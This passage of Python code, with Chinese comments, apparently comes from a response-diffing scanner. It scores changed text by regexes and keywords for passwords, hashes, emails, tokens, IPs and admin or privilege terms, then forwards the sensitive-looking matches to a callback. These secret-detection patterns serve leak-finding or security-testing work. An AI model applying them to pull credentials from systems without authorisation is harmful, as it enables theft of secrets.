            # 1. 基于关键词的重要性判断
            keyword_matches = []
            for category, words in keywords.items():
                for word in words:
                    if word in change.lower():
                        keyword_matches.append((category, word))
            
            # 2. 基于模式的重要性判断 - 增强版多模式识别
            pattern_matches = []
            # 键值对模式（多种格式）
            if re.search(r'\w+[\s=:]+[\w\d@.]+', change):
                pattern_matches.append('key_value')
            if re.search(r'\w+\s*=>\s*[\w\d@.]+', change):
                pattern_matches.append('arrow_pairs')
            # 邮箱和联系信息
            if re.search(r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}', change):
                pattern_matches.append('email')
            if re.search(r'\+?\d{10,}', change):
                pattern_matches.append('phone_like')
            # 哈希和标识符
            if re.search(r'\b[0-9a-f]{32}\b', change, re.IGNORECASE):
                pattern_matches.append('hash_md5')
            if re.search(r'\b[0-9a-f]{40}\b', change, re.IGNORECASE):
                pattern_matches.append('hash_sha1')
            if re.search(r'\b[A-Za-z0-9_]{36}\b', change):
                pattern_matches.append('uuid')
            # 数字ID和序列
            if re.search(r'\b\d{4,}\b', change):
                pattern_matches.append('id_number')
            if re.search(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', change):
                pattern_matches.append('ip_address')
            # 用户名和标识符
            if re.search(r'\b[A-Za-z][A-Za-z0-9_]{3,}\b', change) and not re.match(r'^\d+$', change):
                pattern_matches.append('username_like')
            # 特殊格式
            if re.search(r'[A-Za-z0-9+/=]{8,}', change):
                pattern_matches.append('base64_like')
            # 结构化数据
            if re.search(r'\[.*?\]|\{.*?\}|\(.*?\)', change):
                pattern_matches.append('structured')
            # 数据库相关模式
            if re.search(r'\b(table|column|database|schema)\b', change, re.IGNORECASE):
                pattern_matches.append('database_term')
            
            # 3. 启发式内容特征分析
            content_features = []
            # 检测表格数据特征
            has_multiple_separators = any(change.count(sep) > 2 for sep in all_separators)
            if has_multiple_separators:
                content_features.append('tabular_data')
            # 检测可能的敏感信息格式
            if re.search(r'(password|pwd|passwd)\s*[:=]\s*[\w\d]{6,}', change.lower()):
                content_features.append('potential_password')
            # 检测权限相关词汇
            if any(perm in change.lower() for perm in ['admin', 'root', 'superuser', 'privilege', 'access']):
                content_features.append('privilege_info')
            # 检测版本信息
            if re.search(r'\d+\.\d+(\.\d+)?', change):
                content_features.append('version_info')
            
            # 4. 基于文本长度和复杂性的重要性判断
            text_complexity = calculate_text_complexity(change)
            is_short_but_meaningful = len(change) > 2 and len(change) <= 10 and re.match(r'^[a-zA-Z0-9_@.]+$', change)
            is_normal_significant = len(change) > 10
            has_complex_structure = text_complexity > 0.5
            
            # 5. 检查是否应该忽略 - 智能过滤系统
            should_ignore = False
            if any(ignored in change.lower() for ignored in ignore_patterns):
                # 即使包含忽略关键词，也检查是否同时包含敏感信息
                has_sensitive_info = any(any(word in change.lower() for word in keywords['sensitive']) or 
                                        any(word in change.lower() for word in keywords['user_data']) or
                                        any(pattern in pattern_matches for pattern in ['hash_md5', 'email', 'potential_password'])
                                        for _ in range(1))
                should_ignore = not has_sensitive_info
            # 忽略明显无意义的内容
            if len(change) < 3 and not re.match(r'^\d+$', change):
                should_ignore = True
            if re.match(r'^\s*$', change):
                should_ignore = True
            
            # 6. 自适应重要性评分系统
            significance_score = 0
            # 关键词权重
            for category, _ in keyword_matches:
                if category == 'sensitive':
                    significance_score += 5
                elif category == 'user_data':
                    significance_score += 4
                elif category == 'database':
                    significance_score += 3
                elif category == 'system':
                    significance_score += 2
                elif category == 'error':
                    significance_score += 1
            # 模式匹配权重
            significance_score += len(pattern_matches) * 2
            # 内容特征权重
            for feature in content_features:
                if feature == 'potential_password':
                    significance_score += 6
                elif feature == 'privilege_info':
                    significance_score += 4
                elif feature == 'tabular_data':
                    significance_score += 3
                elif feature == 'version_info':
                    significance_score += 2
            # 长度和复杂性权重
            if is_short_but_meaningful:
                significance_score += 2
            elif is_normal_significant:
                significance_score += 1
            if has_complex_structure:
                significance_score += 2
            # 特殊情况加分
            if new_patterns and (len(change) > 5 or any(p in change.lower() for p in new_patterns)):
                significance_score += 3
            if all_separators and any(sep in change for sep in all_separators) and len(change) > 5:
                significance_score += 2
            
            # 7. 基于阈值的综合判断
            is_significant = significance_score >= 3  # 可调整的阈值
            
            # 对特殊重要的内容，即使分数较低也认为重要
            if any(p in change.lower() for p in ['password', 'hash', 'token', 'secret']) or \
               any(p in pattern_matches for p in ['email', 'hash_md5', 'hash_sha1', 'uuid']):
                is_significant = True
            
            if is_significant and not should_ignore:
                # 为变化添加元数据，便于后续处理
                change_info = {
                    'text': change,
                    'keyword_matches': keyword_matches,
                    'pattern_matches': pattern_matches,
                    'significance_score': len(keyword_matches) * 2 + len(pattern_matches)
                }
                significant_changes.append(change_info)
        
        # 按重要性排序
        significant_changes.sort(key=lambda x: x['significance_score'], reverse=True)
        
        if significant_changes:
            # 创建只包含重要变化的结果，提取纯文本
            important_changes = {
                'added': [change['text'] for change in significant_changes],
                'removed': changes['removed'],
                'all_changes': changes['all_changes'],
                'features': changes['features']
            }
            # 调用回调函数
            scanner.changes_callback(important_changes)
    
    return changes